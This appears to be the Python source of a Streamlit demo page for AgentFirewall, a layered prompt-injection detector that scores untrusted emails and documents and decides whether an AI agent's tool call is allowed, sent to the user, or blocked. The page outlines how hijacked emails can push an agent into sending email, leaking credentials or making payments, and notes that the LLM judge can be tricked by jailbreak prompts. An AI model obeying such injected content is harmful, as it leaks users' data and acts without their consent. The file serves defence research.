st.subheader("Try an Example")
st.caption("Click either button to see an instant precomputed demonstration:")

try_col1, try_col2 = st.columns(2)
with try_col1:

    is_hijacked = st.session_state.get("selected_example_id") == "hijacked"
    st.button(
        "Hijacked Email (Attack)",
        key="btn_try_hijacked",
        icon=":material/warning:",
        use_container_width=True,
        type="primary" if is_hijacked else "secondary",
        on_click=_select_example,
        args=(POISONED_EMAIL, "hijacked", "attack", RiskLevel.HIGH, "send email"),
    )

with try_col2:
    is_normal = st.session_state.get("selected_example_id") == "normal"
    st.button(
        "Normal Email (Safe)",
        key="btn_try_normal",
        icon=":material/check_circle:",
        use_container_width=True,
        type="primary" if is_normal else "secondary",
        on_click=_select_example,
        args=(NORMAL_EMAIL, "normal", "normal", RiskLevel.MEDIUM, "save note"),
    )

st.markdown("---")

# Sub-part: Benchmark Samples Cards
st.subheader("Or Pick a Benchmark Sample")
st.caption("8 real attack and tricky normal patterns tested on Ollama `llama3.2:3b`:")

ex_rows = [EXAMPLES[:4], EXAMPLES[4:]]
for row in ex_rows:
    cols = st.columns(4)
    for i, ex in enumerate(row):
        with cols[i]:
            with st.container(border=True):
                pill_class = "ex-pill-attack" if ex["tag"] == "attack" else "ex-pill-normal"
                is_selected = st.session_state.get("selected_example_id") == ex["id"]
                sel_cls = " ex-card-selected" if is_selected else ""
                st.markdown(
                    f"""
                    <div class="ex-card-content{sel_cls}">
                      <div class="ex-card-tag-row"><span class="{pill_class}">{ex['tag']}</span></div>
                      <div class="ex-card-title">{ex['title']}</div>
                      <div class="ex-card-desc">{ex['short_desc']}</div>
                    </div>
                    """,
                    unsafe_allow_html=True,
                )
                st.button(
                    "Load example",
                    key=f"btn_ex_{ex['id']}",
                    icon=":material/arrow_forward:",
                    use_container_width=True,
                    on_click=_select_example,
                    args=(ex["text"], ex["id"], ex["tag"], ex.get("risk", RiskLevel.HIGH), ex.get("tool", "send email")),
                )

# Result Panel directly under example buttons & benchmark grid
active_result = None
if st.session_state.get("selected_example_id"):
    st.markdown("#### Example Analysis Result")
    ex_id = st.session_state.get("selected_example_id")
    ex_tag = st.session_state.get("selected_example_tag")
    ex_risk = st.session_state.get("selected_example_risk", RiskLevel.HIGH)
    ex_tool = st.session_state.get("selected_example_tool", "send email")
    ex_text = st.session_state.get("scanner_input", "")
    active_result = render_result_panel(
        text=ex_text,
        risk=ex_risk,
        tool_name=ex_tool,
        benchmark_tag=ex_tag,
        example_id=ex_id,
        example_risk=ex_risk,
        cascade_engine=cascade_engine,
        profile=adv_profile,
        is_live_ollama=ollama_available and adv_judge == "ollama (live)",
    )

st.markdown("---")

# Sub-part: Custom Text & Tool Risk
col_custom_title, col_clear = st.columns([5, 1])
with col_custom_title:
    st.subheader("Enter Your Own Text")
with col_clear:
    st.write("")
    st.button("Clear", key="btn_clear_input", on_click=_clear_custom_input, use_container_width=True)

with st.form("custom_scan_form", clear_on_submit=False):
    user_text = st.text_area(
        "Content to analyze (untrusted user input, email body, search snippet, or document):",
        height=130,
        key="main_text_area",
    )

    col_tool, col_prof, col_run = st.columns([2, 1, 1])
    with col_tool:
        tool_risk_choice = st.selectbox(
            "Action the AI is trying to perform:",
            [
                "Send Email or Transfer Funds (High Risk)",
                "Save Note or Update Draft (Medium Risk)",
                "Read Search Results or Local Document (Low Risk)",
            ],
            index=0,
            key="custom_action_risk",
            help="High-risk actions can leak secrets or modify data. Low-risk actions cannot cause external damage.",
        )
        if "High" in tool_risk_choice:
            eval_risk = RiskLevel.HIGH
            eval_tool_name = "send email"
        elif "Medium" in tool_risk_choice:
            eval_risk = RiskLevel.MEDIUM
            eval_tool_name = "save note"
        else:
            eval_risk = RiskLevel.LOW
            eval_tool_name = "read data"

    with col_prof:
        form_profile = st.selectbox(
            "Policy Profile:",
            ["balanced", "strict", "lenient"],
            index=0,
            key="custom_profile_select",
            help="Thresholds for ALLOW, ASK, and BLOCK across tool danger levels.",
        )

    with col_run:
        st.write("")
        st.write("")
        run_scan = st.form_submit_button("Scan with AgentFirewall", icon=":material/shield:", type="primary", use_container_width=True)

if run_scan:
    st.session_state["selected_example_id"] = None
    st.session_state["selected_example_tag"] = None
    if not user_text.strip():
        st.warning("Please enter some text to scan.")
        st.session_state["custom_scan_result"] = None
    else:
        with st.spinner("Scanning with AgentFirewall..."):
            key = hashlib.sha256(user_text.strip().encode("utf-8")).hexdigest()[:16]
            is_bench = key in _PRECOMPUTED_MAP
            if is_bench:
                custom_engine = cascade_engine
            elif ollama_available and adv_judge == "ollama (live)":
                custom_engine = get_cascade(
                    judge_name="ollama",
                    combine=adv_combine,
                    with_clf=adv_clf,
                    profile=form_profile,
                    is_live_ollama=True,
                )
            else:
                # Custom text without reachable live ollama: run with NO judge at all (rules + classifier only)
                custom_engine = get_cascade(
                    judge_name="none",
                    combine=adv_combine,
                    with_clf=adv_clf,
                    profile=form_profile,
                    is_live_ollama=False,
                )

            st.session_state["custom_scan_result"] = {
                "text": user_text,
                "risk": eval_risk,
                "tool_name": eval_tool_name,
                "engine": custom_engine,
                "profile": form_profile,
            }

if st.session_state.get("custom_scan_result"):
    st.markdown("#### Custom Scan Result")
    csr = st.session_state["custom_scan_result"]
    active_result = render_result_panel(
        text=csr["text"],
        risk=csr["risk"],
        tool_name=csr["tool_name"],
        benchmark_tag=None,
        example_id=None,
        example_risk=csr["risk"],
        cascade_engine=csr.get("engine", cascade_engine),
        profile=csr.get("profile", adv_profile),
        is_live_ollama=ollama_available and adv_judge == "ollama (live)",
    )

# Collapsed "Advanced Settings" Expander
with st.expander("Advanced Settings (Judge, Combine Mode, Policy Profile)", expanded=False, icon=":material/tune:"):
    st.caption("Fine-tune firewall parameters. Defaults provide safe, calibrated protection.")
    adv_col1, adv_col2, adv_col3 = st.columns(3)

    with adv_col1:
        if ollama_available:
            judge_opts = ["precomputed", "ollama (live)", "none", "mock"]
        else:
            judge_opts = ["precomputed", "none", "mock", "openai"]
        selected_judge = st.selectbox(
            "Judge Engine",
            judge_opts,
            index=0,
            key="adv_judge_select",
            help="Layer 3 LLM judge. In cloud demo mode, benchmark samples use real precomputed llama3.2:3b verdicts.",
        )

    with adv_col2:
        selected_combine = st.selectbox(
            "Combine Mode",
            ["gated", "max", "blend", "verify"],
            index=0,
            key="adv_combine_select",
            help=(
                "gated: fast rules/ML first; calls judge only in uncertain band [0.35, 0.75]. "
                "max: judge can only raise suspicion. blend: weighted average. verify: judge can lower."
            ),
        )

    with adv_col3:
        selected_profile = st.selectbox(
            "Policy Profile",
            ["balanced", "strict", "lenient"],
            index=0,
            key="adv_profile_select",
            help="Thresholds for ALLOW, ASK, and BLOCK across tool danger levels.",
        )

    clf_enabled = st.checkbox("Enable ML Classifier Layer", value=True, key="adv_clf_enable")

result = active_result if active_result is not None else cascade_engine.evaluate(st.session_state.get("scanner_input", POISONED_EMAIL))
policy_instance = Policy(profile=adv_profile)

# ---------------------------------------------------------------------------
# SECTION 3: HOW IT WORKS (3-Step Strip, 3 Layers Breakdown, Danger Levels)
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown('<h2 id="how-it-works" class="section-heading">How It Works</h2>', unsafe_allow_html=True)
st.markdown(
    "AgentFirewall evaluates untrusted content across three progressive layers, applying tool-aware risk policies before execution."
)

st.markdown(
    f"""
<div class="strip-container">
  <div class="strip-card">
    <div class="strip-card-top">
      <span class="strip-num-badge">1</span>
      {ICON_DOC_SVG}
      <span class="strip-title">AI reads content</span>
    </div>
    <p class="strip-desc">Unchecked text from emails, web search results, or user documents enters the agent.</p>
  </div>
  <div class="strip-card">
    <div class="strip-card-top">
      <span class="strip-num-badge">2</span>
      {ICON_SHIELD_SVG}
      <span class="strip-title">Firewall scores risk</span>
    </div>
    <p class="strip-desc">3 layers: Fast Rules (&lt;1 ms) &rarr; Calibrated ML (~25 ms) &rarr; Gated AI Judge (~3 s).</p>
  </div>
  <div class="strip-card">
    <div class="strip-card-top">
      <span class="strip-num-badge">3</span>
      {ICON_TRAFFIC_SVG}
      <span class="strip-title">Action-aware verdict</span>
    </div>
    <p class="strip-desc">Dangerous tools require strict checks: <strong>ALLOW</strong> / <strong>ASK</strong> / <strong>BLOCK</strong>.</p>
  </div>
</div>
""",
    unsafe_allow_html=True,
)

st.subheader("Integration in Your Agent")
st.markdown("Drop AgentFirewall into your agent workflow with a single wrapper:")
st.code(
    """from agent_firewall import Cascade, Policy, Warden

warden = Warden(cascade=Cascade(), policy=Policy())
clean_result = warden.protect(tool_fn, *args, risk="high")""",
    language="python",
)

st.subheader("Three-Layer Defense Breakdown")

# Layer 1: Rules
rules_layer = result.layers[0] if result.layers else None
rules_score = rules_layer.score if rules_layer else 0.0
rules_time = f"{rules_layer.latency_ms:.1f} ms" if rules_layer else "<1 ms"
rules_pct = int(round(rules_score * 100))

chips_html = "".join([
    f"<span class='chip-tag'>{get_friendly_rule_label(h)}</span>"
    for h in (rules_layer.hits if rules_layer else [])
]) or "<span class='layer-meta-text'>No pattern matches</span>"

# Layer 2: Classifier
clf_layer = result.layers[1] if len(result.layers) > 1 else None
clf_score = clf_layer.score if (clf_layer and not clf_layer.skipped) else 0.0
clf_time = f"{clf_layer.latency_ms:.1f} ms" if (clf_layer and not clf_layer.skipped) else "—"
clf_pct = int(round(clf_score * 100))

if clf_layer and clf_layer.skipped:
    pill_html = "<span class='status-pill-skipped'>Skipped (Decisive)</span>"
    note_text = "Skipped: Layer 1 was decisive (score &ge; 0.90)."
elif clf_layer:
    pill_html = "<span class='status-pill-checked'>Checked</span>"
    note_text = f"Score: <strong style='color:#22D3EE;'>{clf_pct}%</strong> | Latency: <strong>{clf_time}</strong>"
else:
    pill_html = "<span class='status-pill-offline'>Disabled</span>"
    note_text = "Layer disabled."

# Layer 3: AI Judge
judge_layer = result.layers[2] if len(result.layers) > 2 else None
judge_score = judge_layer.score if (judge_layer and not judge_layer.skipped) else 0.0
judge_time = (
    f"{judge_layer.latency_ms / 1000:.1f} s"
    if (judge_layer and not judge_layer.skipped and judge_layer.latency_ms > 0)
    else "—"
)
judge_pct = int(round(judge_score * 100))

if judge_layer and judge_layer.skipped:
    judge_pill = "<span class='status-pill-skipped'>Skipped (Gated)</span>"
    judge_note = "Skipped: Earlier layers were outside uncertain band [0.35, 0.75], saving ~3s."
elif judge_layer and judge_layer.error and "disabled" in judge_layer.error.lower():
    judge_pill = "<span class='status-pill-offline'>Offline in demo</span>"
    judge_note = "Precomputed for benchmark inputs; offline for arbitrary custom text."
elif judge_layer:
    judge_pill = "<span class='status-pill-checked'>Checked</span>"
    judge_note = f"Score: <strong style='color:#22D3EE;'>{judge_pct}%</strong> | Latency: <strong>{judge_time}</strong>"
else:
    judge_pill = "<span class='status-pill-skipped'>Not invoked</span>"
    judge_note = "Not invoked."

st.markdown(
    f"""
    <div class="layer-cards-grid">
      <div class="layer-card-container">
        <div>
          <div class="layer-card-header">
            <div class="layer-card-title-wrap">{ICON_RULES_SVG} Layer 1: Rules</div>
            <span class="status-pill-checked">Checked</span>
          </div>
          <div class="layer-desc-text">Instantly scans for known attack patterns, hidden HTML comments, and base64 payloads.</div>
          <div class="layer-meta-text">
            Score: <strong style="color:#22D3EE;">{rules_pct}%</strong> | Latency: <strong>{rules_time}</strong>
          </div>
        </div>
        <div style="margin-top:8px;">{chips_html}</div>
        <div class="layer-card-progress-track">
          <div class="layer-card-progress-fill" style="width: {rules_pct}%;"></div>
        </div>
      </div>

      <div class="layer-card-container">
        <div>
          <div class="layer-card-header">
            <div class="layer-card-title-wrap">{ICON_CLASSIFIER_SVG} Layer 2: ML Classifier</div>
            {pill_html}
          </div>
          <div class="layer-desc-text">Statistical model trained on attack grammar to catch rephrased or multilingual variants.</div>
          <div class="layer-meta-text">{note_text}</div>
        </div>
        <div class="layer-sub-text">Calibrated Logistic Regression</div>
        <div class="layer-card-progress-track">
          <div class="layer-card-progress-fill" style="width: {clf_pct}%;"></div>
        </div>
      </div>

      <div class="layer-card-container">
        <div>
          <div class="layer-card-header">
            <div class="layer-card-title-wrap">{ICON_JUDGE_SVG} Layer 3: AI Judge</div>
            {judge_pill}
          </div>
          <div class="layer-desc-text">Deep reasoning LLM invoked only in the uncertain score band [0.35, 0.75] to save cost.</div>
          <div class="layer-meta-text">{judge_note}</div>
        </div>
        <div class="layer-sub-text">Ollama llama3.2:3b / Prompt v2</div>
        <div class="layer-card-progress-track">
          <div class="layer-card-progress-fill" style="width: {judge_pct}%;"></div>
        </div>
      </div>
    </div>
    """,
    unsafe_allow_html=True,
)

st.subheader("Action-Aware Decisions Across Danger Levels")
st.caption("The exact same content triggers different safeguards based on the danger of the tool:")

all_decisions = policy_instance.decide_all(result.suspicion)
dec_col1, dec_col2, dec_col3 = st.columns(3)

for i, (col, risk_lvl) in enumerate(zip([dec_col1, dec_col2, dec_col3], RiskLevel)):
    d = all_decisions[risk_lvl]
    with col:
        st.markdown(f"**{risk_lvl.value.upper()} RISK TOOL**")
        if risk_lvl == RiskLevel.LOW:
            st.caption("E.g. read email, web search, view docs")
        elif risk_lvl == RiskLevel.MEDIUM:
            st.caption("E.g. save note, draft reply, edit calendar")
        else:
            st.caption("E.g. send email, delete files, payment")

        if d == Decision.ALLOW:
            st.success(f"**{d.value}** — Proceed safely")
        elif d == Decision.ASK:
            st.warning(f"**{d.value}** — Confirm with user")
        else:
            st.error(f"**{d.value}** — Block immediately")

with st.expander("What does this mean? (Plain-English Explanations)", expanded=False, icon=":material/help:"):
    st.markdown(
        """
        **Suspicion Score (0% to 100%):**
        - 0% indicates normal, harmless workplace conversation or standard documentation.
        - 100% indicates unambiguous malicious instructions or command overrides.
        - Scores in the middle (35%–75%) represent ambiguous or borderline phrasing.
        - Multiple layers combine: regex catches blatant tricks; machine learning catches subtle phrasing.

        **Tool Risk Level (Blast Radius):**
        - Low-risk tools (search, read-only view) cannot cause external damage or leak credentials.
        - Medium-risk tools (saving drafts, updating records) have moderate consequences if tricked.
        - High-risk tools (sending emails, making payments, running commands) can leak confidential data.
        - Higher tool danger demands stricter safety thresholds before the AI is allowed to act.

        **The Action-Aware Policy Table:**
        - Rather than a rigid all-or-nothing block, the firewall tailors reactions to tool consequences.
        - Slightly suspicious text is allowed to perform safe searches, but blocked from sending emails.
        - "Ask the User" places a human in the loop for borderline cases rather than failing silently.
        - This eliminates alert fatigue for everyday tasks while keeping critical actions airtight.
        """
    )
    st.markdown(
        """
        <table class="matrix-table">
          <thead>
            <tr>
              <th>Tool Risk Level</th>
              <th>Safe Range (0% - 49%)</th>
              <th>Uncertain Range (50% - 79%)</th>
              <th>Suspicious Range (80% - 100%)</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Low Risk</strong> (read, search)</td>
              <td class="matrix-cell-allow">ALLOW</td>
              <td class="matrix-cell-allow">ALLOW</td>
              <td class="matrix-cell-block">BLOCK</td>
            </tr>
            <tr>
              <td><strong>Medium Risk</strong> (edit, save note)</td>
              <td class="matrix-cell-allow">ALLOW</td>
              <td class="matrix-cell-ask">ASK USER</td>
              <td class="matrix-cell-block">BLOCK</td>
            </tr>
            <tr>
              <td><strong>High Risk</strong> (send email, pay)</td>
              <td class="matrix-cell-allow">ALLOW</td>
              <td class="matrix-cell-ask">ASK USER</td>
              <td class="matrix-cell-block">BLOCK</td>
            </tr>
          </tbody>
        </table>
        """,
        unsafe_allow_html=True,
    )

# ---------------------------------------------------------------------------
# SECTION 4: WHY LAYERS? (Defense-in-Depth Comparison)
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown('<h2 id="why-layers" class="section-heading">Why Layers?</h2>', unsafe_allow_html=True)
st.markdown(
    "No single detection technique is sufficient to secure an AI agent. "
    "A resilient firewall requires defense-in-depth where complementary layers cover each other's blind spots."
)

why_col1, why_col2, why_col3 = st.columns(3)
with why_col1:
    with st.container(border=True):
        st.markdown(
            f"""
            <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
              {ICON_RULES_SVG}
              <span style="font-size:18px; font-weight:700; color:#E8ECF8;">Regex Rules</span>
            </div>
            <p style="font-size:15px; color:#A9B3D1; margin-bottom:12px;"><strong>Speed:</strong> &lt;1 ms | <strong>Cost:</strong> Free</p>
            <p style="font-size:15px; color:#22C55E; margin-bottom:6px;"><strong>✓ Strengths:</strong> Deterministic, instantaneous. Catches known delimiters, raw Base64, and hidden HTML comments without GPU compute.</p>
            <p style="font-size:15px; color:#F87171; margin:0;"><strong>✗ Blind spots:</strong> Misses creative synonyms, multilingual attacks, or rephrased instructions that avoid literal keywords.</p>
            """,
            unsafe_allow_html=True,
        )

with why_col2:
    with st.container(border=True):
        st.markdown(
            f"""
            <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
              {ICON_CLASSIFIER_SVG}
              <span style="font-size:18px; font-weight:700; color:#E8ECF8;">ML Classifier</span>
            </div>
            <p style="font-size:15px; color:#A9B3D1; margin-bottom:12px;"><strong>Speed:</strong> ~25 ms | <strong>Cost:</strong> Minimal</p>
            <p style="font-size:15px; color:#22C55E; margin-bottom:6px;"><strong>✓ Strengths:</strong> Statistical n-gram & TF-IDF model. Catches paraphrased commands and multilingual patterns (e.g. Hinglish).</p>
            <p style="font-size:15px; color:#F87171; margin:0;"><strong>✗ Blind spots:</strong> Lacks semantic understanding of complex multi-step workflows or contextual user instructions.</p>
            """,
            unsafe_allow_html=True,
        )

with why_col3:
    with st.container(border=True):
        st.markdown(
            f"""
            <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
              {ICON_JUDGE_SVG}
              <span style="font-size:18px; font-weight:700; color:#E8ECF8;">AI Judge</span>
            </div>
            <p style="font-size:15px; color:#A9B3D1; margin-bottom:12px;"><strong>Speed:</strong> ~3.5 s | <strong>Cost:</strong> High</p>
            <p style="font-size:15px; color:#22C55E; margin-bottom:6px;"><strong>✓ Strengths:</strong> Deep reasoning LLM. Understands nuanced conversational context, intent, and indirect injections.</p>
            <p style="font-size:15px; color:#F87171; margin:0;"><strong>✗ Blind spots:</strong> 100x slower, expensive, and can be tricked by adversarial jailbreak prompts or spoofed JSON.</p>
            """,
            unsafe_allow_html=True,
        )

st.markdown(
    """
    <div class="callout-info" style="margin-top:20px;">
      <strong>The Gated Cascade Advantage:</strong>
      Instead of calling a slow 3-second LLM for every input, AgentFirewall executes Fast Rules and the ML Classifier first.
      If their verdict is clear (&lt;35% or &gt;75%), the system makes an instant decision in ~25 ms.
      The expensive AI Judge is only invoked for the borderline 15% of inputs, achieving <strong>85%+ protection</strong> while keeping <strong>over 80% of agent traffic sub-25ms</strong>.
    </div>
    """,
    unsafe_allow_html=True,
)

# ---------------------------------------------------------------------------
# SECTION 5: BENCHMARKS (Real Ablation Stats & Scope Limitations)
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown('<h2 id="benchmarks" class="section-heading">Benchmarks</h2>', unsafe_allow_html=True)
st.markdown("Performance measured on real attack samples and tricky normal messages.")

stats = load_benchmark_results()

metric_col1, metric_col2, metric_col3, metric_col4 = st.columns(4)
with metric_col1:
    st.metric("Rules + Classifier Catch Rate", stats.get("rules_classifier_catch", "83.9%"))
    st.caption("Evaluated at ~24 ms latency")

with metric_col2:
    st.metric("Full Cascade Catch Rate", stats.get("full_cascade_catch", "85.7%"))
    st.caption("With gated LLM judge fallback")

with metric_col3:
    st.metric("False Alarm Rate", stats.get("rules_classifier_fp", "5.1%"))
    st.caption("Benign messages incorrectly flagged")

with metric_col4:
    st.metric("Benchmark Samples", str(stats.get("sample_count", 115)))
    st.caption("Diverse hand-written test suite")

st.markdown(
    f"""
    <div class="callout-amber">
      <strong>⚠️ Limitations & Scope:</strong> {stats.get('note', 'exploratory set, small sample, see limitations')}.
      All figures are parsed directly from benchmark results files (see <code>results/ablation_fresh_ollama_v2.md</code>).
    </div>
    """,
    unsafe_allow_html=True,
)

# ---------------------------------------------------------------------------
# SITE FOOTER (Requirement 2 & 3: LINKS Dict, LIVE Flags & 3 Columns)
# ---------------------------------------------------------------------------
if LIVE["github"]:
    footer_license_html = f'<a href="{LINKS["license"]}" target="_blank" rel="noopener noreferrer" style="color:#22D3EE; font-weight:600; text-decoration:none;">MIT License</a> &middot; Open Source'
    res_github_html = f'<li><a href="{LINKS["github_repo"]}" target="_blank" rel="noopener noreferrer">GitHub Repository</a></li>'
    res_issues_html = f'<li><a href="{LINKS["issues"]}" target="_blank" rel="noopener noreferrer">Report a Bug / Issue</a></li>'
    footer_author_html = f'Built by <a href="{LINKS["author_profile"]}" target="_blank" rel="noopener noreferrer" style="color:#22D3EE; font-weight:600; text-decoration:none;">{AUTHOR_NAME}</a>'
else:
    footer_license_html = 'MIT License &middot; Open Source'
    res_github_html = '<li><span class="footer-link-disabled">GitHub Repository (Coming Soon)</span></li>'
    res_issues_html = '<li><span class="footer-link-disabled">Report a Bug / Issue (Coming Soon)</span></li>'
    footer_author_html = f'Built by <span style="color:#22D3EE; font-weight:600;">{AUTHOR_NAME}</span>'

if LIVE["docs"]:
    res_docs_html = f'<li><a href="{LINKS["docs"]}" target="_blank" rel="noopener noreferrer">Documentation Site</a></li>'
else:
    res_docs_html = '<li><span class="footer-link-disabled">Documentation Site (Coming Soon)</span></li>'

if LIVE["pypi"]:
    res_pypi_html = f'<li><a href="{LINKS["pypi"]}" target="_blank" rel="noopener noreferrer">PyPI Package (agent-firewall-cascade)</a></li>'
else:
    res_pypi_html = '<li><span class="footer-link-disabled">PyPI Package (Coming Soon)</span></li>'

if LIVE["dataset"]:
    res_dataset_html = f'<li><a href="{LINKS["dataset"]}" target="_blank" rel="noopener noreferrer">HuggingFace Dataset Card</a></li>'
else:
    res_dataset_html = '<li><span class="footer-link-disabled">HuggingFace Dataset (Coming Soon)</span></li>'

st.markdown(
    f"""
<footer class="site-footer">
  <div class="footer-grid">
    <div class="footer-col">
      <div style="display:flex; align-items:center; gap:10px; margin-bottom:12px;">
        {LOGO_SVG}
        <span class="footer-brand-name">{BRAND_NAME}</span>
      </div>
      <p class="footer-text">A risk-aware firewall for AI agents stopping prompt injection attacks.</p>
      <p class="footer-text">{footer_license_html}</p>
    </div>
    <div class="footer-col">
      <div class="footer-col-title">Resources &amp; Links</div>
      <ul class="footer-links-list">
        {res_github_html}
        {res_docs_html}
        {res_pypi_html}
        {res_dataset_html}
        {res_issues_html}
      </ul>
    </div>
    <div class="footer-col">
      <div class="footer-col-title">Author &amp; Research</div>
      <p class="footer-text">{footer_author_html}</p>
      <p class="footer-text">Research in AI Safety, Agent Tool Call Interception, and Prompt Injection Defense.</p>
    </div>
  </div>
  <div class="footer-bottom-bar">
    &copy; 2026 {AUTHOR_NAME} &middot; Research prototype, not a guarantee of security &middot; Live demo runs rules + classifier; judge verdicts are precomputed.
  </div>
</footer>
""",
    unsafe_allow_html=True,
)

from streamlit.runtime import exists as _runtime_exists

if not _runtime_exists():
    st._main._form_data = None
    from streamlit.delta_generator import context_dg_stack as _ctx_dg_stack
    _ctx_dg_stack.set(())
